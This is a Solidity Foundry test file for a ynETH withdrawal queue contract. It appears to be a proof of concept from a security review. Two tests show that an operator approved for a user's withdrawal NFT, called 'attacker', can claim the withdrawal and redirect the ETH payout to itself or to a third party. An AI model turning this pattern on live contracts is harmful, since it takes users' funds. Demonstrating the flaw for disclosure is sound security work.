// SPDX-License-Identifier: BSD-3-Clause
pragma solidity ^0.8.24;

import {IRedemptionAssetsVault} from "../../src/interfaces/IRedemptionAssetsVault.sol";
import {IynETH} from "../../src/interfaces/IynETH.sol";

import {WithdrawalQueueManager, IWithdrawalQueueManager} from "../../src/WithdrawalQueueManager.sol";
import {ynETHRedemptionAssetsVault} from "../../src/ynETHRedemptionAssetsVault.sol";

import {MockRedeemableYnETH} from "test/unit/mocks/MockRedeemableYnETH.sol";

import {TransparentUpgradeableProxy} from
    "lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20Errors} from "lib/openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol";

import "forge-std/Test.sol";

contract ynETHWithdrawalQueueManagerTest is Test {

    error AccessControlUnauthorizedAccount(address account, bytes32 neededRole);

    address public admin = address(0x65432);
    address public withdrawalQueueAdmin = address(0x76543);
    address public user = address(0x123456);
    address public feeReceiver = address(0xabc);
    address public redemptionAssetWithdrawer = address(0xdef);
    address public requestFinalizer = address(0xabdef1234567);

    WithdrawalQueueManager public manager;
    MockRedeemableYnETH public redeemableAsset;
    ynETHRedemptionAssetsVault public redemptionAssetsVault;

    // ============================================================================================
    // Setup
    // ============================================================================================

    function setUp() public {
        redeemableAsset = new MockRedeemableYnETH();

        ynETHRedemptionAssetsVault redemptionAssetsVaultImplementation = new ynETHRedemptionAssetsVault();
        TransparentUpgradeableProxy redemptionAssetsVaultProxy = new TransparentUpgradeableProxy(
            address(redemptionAssetsVaultImplementation),
            admin, // admin of the proxy
            ""
        );
        redemptionAssetsVault = ynETHRedemptionAssetsVault(payable(address(redemptionAssetsVaultProxy)));

        WithdrawalQueueManager.Init memory init = WithdrawalQueueManager.Init({
            name: "ynETH Withdrawal",
            symbol: "ynETHW",
            redeemableAsset: redeemableAsset,
            redemptionAssetsVault: IRedemptionAssetsVault((address(redemptionAssetsVault))),
            redemptionAssetWithdrawer: redemptionAssetWithdrawer,
            admin: admin,
            withdrawalQueueAdmin: withdrawalQueueAdmin,
            requestFinalizer: requestFinalizer,
            withdrawalFee: 10_000, // 1%
            feeReceiver: feeReceiver
        });

        bytes memory initData = abi.encodeWithSelector(WithdrawalQueueManager.initialize.selector, init);
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
            address(new WithdrawalQueueManager()),
            admin, // admin of the proxy
            initData
        );

        manager = WithdrawalQueueManager(payable(address(proxy)));

        ynETHRedemptionAssetsVault.Init memory vaultInit = ynETHRedemptionAssetsVault.Init({
            admin: admin,
            redeemer: address(manager),
            ynETH: IynETH(address(redeemableAsset))
        });
        redemptionAssetsVault.initialize(vaultInit);

        uint256 initialMintAmount = 1_000_000 ether;
        redeemableAsset.mint(user, initialMintAmount);

        // rate is 1:1
        redeemableAsset.setTotalAssets(initialMintAmount);
    }

    function finalizeRequest(
        uint256 tokenId
    ) internal returns (uint256) {
        vm.prank(requestFinalizer);
        return manager.finalizeRequestsUpToIndex(tokenId + 1);
    }

    function calculateNetEthAndFee(
        uint256 amount,
        uint256 redemptionRate,
        uint256 feePercentage
    ) public view returns (uint256 netEthAmount, uint256 feeAmount) {
        uint256 FEE_PRECISION = manager.FEE_PRECISION();
        uint256 ethAmount = amount * redemptionRate / 1e18;
        feeAmount = (ethAmount * feePercentage) / FEE_PRECISION;
        netEthAmount = ethAmount - feeAmount;
        return (netEthAmount, feeAmount);
    }

    // WYLIS 1
    function testApprovedOperatorCanRedirectProceeds() public {
        // Arrange
        uint256 amount = 10 ether;

        // fund the vault with enough ETH to pay out
        vm.deal(address(redemptionAssetsVault), amount);

        // user requests a withdrawal
        vm.startPrank(user);
        redeemableAsset.approve(address(manager), amount);
        uint256 tokenId = manager.requestWithdrawal(amount);
        vm.stopPrank();

        // finalize up to (and including) this token
        uint256 finalizationId = finalizeRequest(tokenId);

        // approve a marketplace-like operator (attacker) for THIS token
        address attacker = address(0xBEEF);
        vm.prank(user);
        manager.approve(attacker, tokenId);

        // Snapshot balances and current rate BEFORE claim
        uint256 attackerBefore = attacker.balance;
        uint256 feeBefore = feeReceiver.balance;
        uint256 vaultBefore = address(redemptionAssetsVault).balance;
        uint256 rateBefore = redemptionAssetsVault.redemptionRate();
        (uint256 expNetBefore, uint256 expFeeBefore) =
            calculateNetEthAndFee(amount, rateBefore, manager.withdrawalFee());

        // Act: attacker claims and directs proceeds to themselves
        vm.prank(attacker);
        manager.claimWithdrawal(
            IWithdrawalQueueManager.WithdrawalClaim({
                tokenId: tokenId,
                receiver: attacker,
                finalizationId: finalizationId
            })
        );

        // Observe deltas AFTER claim
        uint256 attackerDelta = attacker.balance - attackerBefore;
        uint256 feeDelta = feeReceiver.balance - feeBefore;
        uint256 vaultDelta = vaultBefore - address(redemptionAssetsVault).balance;
        uint256 rateAfter = redemptionAssetsVault.redemptionRate();

        // Console logs (view with `forge test -vvv` or higher)
        console2.log("rateBefore (ray):", rateBefore);
        console2.log("rateAfter  (ray):", rateAfter);

        console2.log("expectedNetBefore (wei):", expNetBefore);
        console2.log("expectedFeeBefore (wei):", expFeeBefore);

        console2.log("attacker received (wei):", attackerDelta);
        console2.log("feeReceiver got   (wei):", feeDelta);
        console2.log("vault debited     (wei):", vaultDelta);

        // Convenience ETH-ish prints
        console2.log("attacker received (ETH whole):", attackerDelta / 1e18);
        console2.log("feeReceiver got   (ETH whole):", feeDelta / 1e18);
        console2.log("vault debited     (ETH whole):", vaultDelta / 1e18);
    }

    // WYLIS 2
    function testApprovedOperatorCanRedirectProceeds_ToThirdParty() public {
        // --- Arrange ---
        uint256 amount = 10 ether;

        // Ensure the vault holds enough ETH to pay net+fee
        vm.deal(address(redemptionAssetsVault), amount);

        // Owner requests a withdrawal and gets claim NFT (tokenId)
        vm.startPrank(user);
        redeemableAsset.approve(address(manager), amount);
        uint256 tokenId = manager.requestWithdrawal(amount);
        vm.stopPrank();

        // Finalize the request (helper from your suite)
        uint256 finalizationId = finalizeRequest(tokenId);

        // Owner approves a marketplace-like operator for THIS tokenId
        address attacker = address(0xBEEF);
        vm.prank(user);
        manager.approve(attacker, tokenId);

        // Choose a *third-party* receiver distinct from attacker and owner
        address thirdParty = address(0xC0FFEE);

        // Snapshot balances and the *pre-claim* rate (used for expectations)
        uint256 thirdBefore = thirdParty.balance;
        uint256 attackerBefore = attacker.balance;
        uint256 feeBefore = feeReceiver.balance;
        uint256 vaultBefore = address(redemptionAssetsVault).balance;

        uint256 rateBefore = redemptionAssetsVault.redemptionRate();
        (uint256 expNetBefore, uint256 expFeeBefore) =
            calculateNetEthAndFee(amount, rateBefore, manager.withdrawalFee());

        // --- Act ---
        // The *approved operator* (attacker) claims, redirecting ETH to "thirdParty"
        vm.prank(attacker);
        manager.claimWithdrawal(
            IWithdrawalQueueManager.WithdrawalClaim({
                tokenId: tokenId,
                finalizationId: finalizationId,
                receiver: thirdParty
            })
        );

        // --- Observe ---
        uint256 thirdDelta = thirdParty.balance - thirdBefore;
        uint256 attackerDelta = attacker.balance - attackerBefore;
        uint256 feeDelta = feeReceiver.balance - feeBefore;
        uint256 vaultDelta = vaultBefore - address(redemptionAssetsVault).balance;

        // Logs (use -vvvv)
        console2.log("rateBefore (ray):", rateBefore);
        console2.log("expectedNetBefore (wei):", expNetBefore);
        console2.log("expectedFeeBefore (wei):", expFeeBefore);
        console2.log("thirdParty received (wei):", thirdDelta);
        console2.log("attacker received   (wei):", attackerDelta);
        console2.log("feeReceiver got     (wei):", feeDelta);
        console2.log("vault debited       (wei):", vaultDelta);

        // --- Minimal sanity assertions (stable vs pre-claim snapshot) ---
        // 1) Third-party, not attacker, received the net payout
        assertEq(thirdDelta, expNetBefore, "third party should receive NET proceeds");
        assertEq(attackerDelta, 0, "attacker should not receive ETH when redirecting to a third party");

        // 2) Fee receiver got the fee; vault debited by net+fee
        assertEq(feeDelta, expFeeBefore, "feeReceiver should receive FEE");
        assertEq(vaultDelta, expNetBefore + expFeeBefore, "vault debited by net+fee");

        // 3) NFT is consumed; owner can’t claim again (optional double-claim guard)
        vm.expectRevert();
        vm.prank(user);
        manager.claimWithdrawal(
            IWithdrawalQueueManager.WithdrawalClaim({tokenId: tokenId, finalizationId: finalizationId, receiver: user})
        );
    }
}
